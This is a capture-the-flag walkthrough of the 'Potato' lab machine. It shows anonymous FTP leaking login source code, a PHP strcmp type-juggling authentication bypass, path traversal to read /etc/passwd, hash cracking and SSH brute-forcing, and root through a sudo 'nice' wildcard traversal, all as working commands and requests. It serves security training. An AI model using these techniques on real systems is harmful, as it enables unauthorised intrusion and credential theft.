# Potato

## Initial access

Run `autorecon` to enumerate the target:

```
sudo autorecon 192.168.239.101
```

Open ports discovered:

- **22** — SSH (OpenSSH 8.2p1 Ubuntu 4ubuntu0.1, Ubuntu Linux; protocol 2.0)
- **80** — HTTP (Apache httpd 2.4.41, Ubuntu)
  - Additional webpages:
    - `http://192.168.239.101/admin/`
    - `http://192.168.239.101/potato.jpg`
- **2112** — FTP (ProFTPD)
  - Anonymous login allowed

### FTP Enumeration

Connected to FTP on port 2112 as anonymous and found two files:

```
ftp anonymous@192.168.239.101 -p 2112
ftp> ls -al
drwxr-xr-x   2 ftp      ftp          4096 Aug  2  2020 .
drwxr-xr-x   2 ftp      ftp          4096 Aug  2  2020 ..
-rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg
```

The `welcome.msg` contained a standard ProFTPD greeting. The `index.php.bak` file contained PHP source code for a login page:

```php
$pass= "potato"; //note Change this password regularly

if($_GET['login']==="1"){
  if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {
    echo "Welcome! </br> Go to the <a href=\"dashboard.php\">dashboard</a>";
    setcookie('pass', $pass, time() + 365*24*3600);
  }else{
    echo "<p>Bad login/password! </br> Return to the <a href=\"index.php\">login page</a> <p>";
  }
  exit();
}
```

This suggested a possible username of `admin` and password of `potato`. However, logging in at `http://192.168.239.101/admin/` with these credentials failed.

### Admin Panel Exploitation

Performed directory busting on the `/admin/` path and found log files:

```
feroxbuster -u http://192.168.239.101/admin/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --scan-dir-listings
200      GET        4l       14w       86c http://192.168.239.101/admin/logs/log_01.txt
200      GET        4l       15w       88c http://192.168.239.101/admin/logs/log_02.txt
200      GET        4l       14w      597c http://192.168.239.101/admin/logs/log_03.txt
```

The logs revealed:
- `log_01.txt`: Password changed on January 03, 2020 — the password is no longer `potato`.
- `log_02.txt`: Server rebooted on January 09, 2020.
- `log_03.txt`: Password changed again on August 02, 2020.

Tried brute-forcing the login with `hydra` but got no results.

Re-examining the source code, the `strcmp()` comparison was vulnerable to a PHP type-juggling attack. When an array is passed instead of a string, `strcmp()` returns `NULL`. Since the code uses loose comparison (`== 0`), `NULL == 0` evaluates to `TRUE`, bypassing authentication entirely.

Sent a crafted request using Burp Suite with `password[]=` (an empty array) to bypass the login:

```
POST /admin/index.php?login=1 HTTP/1.1
Host: 192.168.239.101
Content-Length: 26
...
username=admin&password[]=
```

The response included a session cookie: `pass=serdesfsefhijosefjtfgyuhjiosefdfthgyjh`. Added this cookie to the browser and accessed the dashboard at `http://192.168.239.101/admin/dashboard.php`.

### Path Traversal

The dashboard had `Home`, `Users`, `Date`, `Logs`, and `Ping` tabs. The `Logs` tab accepted a `file` parameter via POST request. Tested for path traversal:

```
POST /admin/dashboard.php?page=log HTTP/1.1
Host: 192.168.239.101
...
file=../../../../../../etc/passwd
```

The traversal worked and revealed the contents of `/etc/passwd`, which included a `webadmin` user with a password hash:

```
webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash
```

Cracked the MD5 hash using `hashcat`:

```
hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt
$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:dragon
```

Logged in as `webadmin` via SSH:

```
ssh webadmin@192.168.239.101
webadmin@192.168.239.101's password: dragon

webadmin@lab-pg-10-ubuntu20-potato-244-189:~$ whoami
webadmin
```

Retrieved the local flag:

```
webadmin@lab-pg-10-ubuntu20-potato-244-189:~$ cat local.txt
b544b86d3a10b25e11195222997769fa
```

### Alternative Initial Access — nmap SSH Brute-Force

The `nmap` SSH brute-force script (`ssh-brute.nse`) targets the SSH service on port 22 and reveals valid credentials through dictionary-based password guessing. This found the credentials `webadmin:dragon`, which can be used to SSH directly into the target, bypassing the web exploitation chain entirely.

```
nmap -p 22 --script=/usr/share/nmap/scripts/ssh-brute.nse 192.168.239.101
```

Credit: [dsec — Potato (PG) - CTF Writeups](https://dsec.blog/potato)

## Privilege escalation

Uploaded `linpeas.sh` via `scp`:

```
scp linpeas.sh webadmin@192.168.239.101:/tmp
```

Ran `linpeas.sh`. Noted that `DirtyFrag` and `pwnkit` worked but `copyfail` did not.

Checked sudo privileges:

```
webadmin@lab-pg-10-ubuntu20-potato-244-189:/tmp$ sudo -l
User webadmin may run the following commands on lab-pg-10-ubuntu20-potato-244-189:
    (ALL : ALL) /bin/nice /notes/*
```

The `nice` command can run any binary within `/notes` as `root`. Took advantage of the wildcard in `/notes/*` to perform path traversal and gain a privileged shell:

```
webadmin@lab-pg-10-ubuntu20-potato-244-189:/tmp$ sudo /bin/nice /notes/../bin/bash
root@lab-pg-10-ubuntu20-potato-244-189:/tmp# whoami
root
```

Retrieved the proof flag:

```
root@lab-pg-10-ubuntu20-potato-244-189:/# cd /root
root@lab-pg-10-ubuntu20-potato-244-189:~# cat proof.txt
1aa841dcf5e2a88d3aac91b115924c39
```
